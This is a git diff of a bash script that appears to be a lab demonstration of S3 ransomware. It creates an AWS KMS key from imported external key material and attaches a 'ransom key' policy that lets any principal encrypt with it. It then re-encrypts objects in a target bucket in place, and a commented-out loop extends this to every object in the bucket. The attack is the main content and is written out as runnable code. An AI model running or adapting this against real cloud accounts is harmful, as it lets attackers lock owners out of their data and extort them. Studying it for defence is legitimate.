@@ -1,7 +1,21 @@
 #!/bin/bash
 
-# set aws profile
-export AWS_PROFILE="dev-test"
+########################################
+# create_external_kms_key.sh
+########################################
+# this script creates a new kms key with 
+# external key material and then uses
+# that key to encrypt files in a target
+# s3 bucket
+#########################################
+
+# aws account where kms key will be created
+export AWS_ACCOUNT_ID=$(aws sts get-caller-identity | jq '.Account' --raw-output)
+# aws current user arn
+export AWS_CURRENT_USER=$(aws sts get-caller-identity | jq '.Arn' --raw-output)
+
+# s3 bucket to be encrypted
+export S3_BUCKET=$(aws s3 ls | grep attacksurface-target | awk '{print $3}' | head -1)
 
 # create key with no key material (get key-id from output)
 export KEY_ID=`aws kms create-key --origin EXTERNAL | jq '.KeyMetadata.KeyId' --raw-output`
@@ -12,7 +26,7 @@ openssl rand -out PlaintextKeyMaterial.bin 32
 openssl base64 -in PlaintextKeyMaterial.bin -out PlaintextKeyMaterial.b64
 
 # generate import params
-export KEY=`aws kms --profile=dev-test --region us-east-1 get-parameters-for-import --key-id ${KEY_ID} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text`
+export KEY=`aws kms --region us-east-1 get-parameters-for-import --key-id ${KEY_ID} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text`
 echo "Key Import Params: ${KEY}"
 
 # create base64 publickey and token
@@ -36,7 +50,7 @@ openssl pkeyutl \
     -pkeyopt rsa_oaep_md:sha256
 
 # import encrypted key material
-aws kms --profile=dev-test \
+aws kms \
     --region us-east-1 \
     import-key-material \
     --key-id ${KEY_ID} \
@@ -44,6 +58,102 @@ aws kms --profile=dev-test \
     fileb://EncryptedKeyMaterial.bin \
     --import-token fileb://ImportToken.bin \
     --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
+
+# example policy of kms ransom key - globally readable
+# see: https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
+cat <<EOF > new_key_policy.json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "EnableIAMUserPermissions",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "arn:aws:iam::870229293131:root"
+            },
+            "Action": "kms:*",
+            "Resource": "*"
+        },
+        {
+            "Sid": "EnableCurrentUserKeySetup",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "${AWS_CURRENT_USER}"
+            },
+            "Action": [
+                    "kms:CreateKey",
+                    "kms:ImportKey",
+                    "kms:ImportKeyMaterial",
+                    "kms:DeleteKey",
+                    "kms:DeleteKeyMaterial",
+                    "kms:EnableKey",
+                    "kms:DisableKey",
+                    "kms:ScheduleKeyDeletion",
+                    "kms:PutKeyPolicy",
+                    "kms:SetPolicy",
+                    "kms:DeletePolicy",
+                    "kms:CreateGrant",
+                    "kms:DeleteIdentity",
+                    "kms:DescribeIdentity",
+                    "kms:KeyStatus",
+                    "kms:Status",                        
+                    "kms:List*",
+                    "kms:Get*",
+                    "kms:Describe*",
+                    "tag:GetResources"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "EnableGlobalKMSEncrypt",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "*"
+            },
+            "Action": [
+                "kms:GenerateDataKey",
+                "kms:Encrypt"
+            ],
+            "Resource": "*"
+        }
+    ]
+}
+EOF
+
+# add key policy
+aws kms put-key-policy \
+    --policy-name default \
+    --key-id ${KEY_ID} \
+    --policy file://new_key_policy.json
+
+# create unencrypted file and copy to s3
+echo "sample file" | aws s3 cp - s3://${S3_BUCKET}/files/sample_file.txt
+
+# read unencypted content
+echo "Unencrypted content: $(aws s3 cp s3://${S3_BUCKET}/files/sample_file.txt -)"
+
+# encrypt existing file
+aws s3 cp \
+    s3://${S3_BUCKET}/files/sample_file.txt s3://${S3_BUCKET}/files/sample_file.txt \
+    --sse aws:kms \
+    --sse-kms-key-id "arn:aws:kms:us-east-1:${AWS_ACCOUNT_ID}:key/${KEY_ID}"
+
+# attempt to read encrypted file
+echo "Encrypted content: $(aws s3 cp s3://${S3_BUCKET}/files/sample_file.txt -)"
+
+# bucketname="attacksurface-target-s3-bucket-46qsim8h"
+# aws s3 ls ${bucketname} --recursive | awk '{ print $NF }' > /tmp/filelist
+
+# for file in `cat /tmp/filelist`
+# do
+#         class=`aws s3api head-object --bucket ${bucketname} --key $file  | jq -r '.StorageClass'`
+#         if [ "$class" = "null" ]
+#         then
+#                 class="STANDARD"
+
+#         fi
+#         echo "aws s3 cp s3://${bucketname}/${file} s3://${bucketname}/${file} --sse  --storage-class ${class}"
+# done
 
 # alternative key expiry
 #--expiration-model KEY_MATERIAL_EXPIRES \
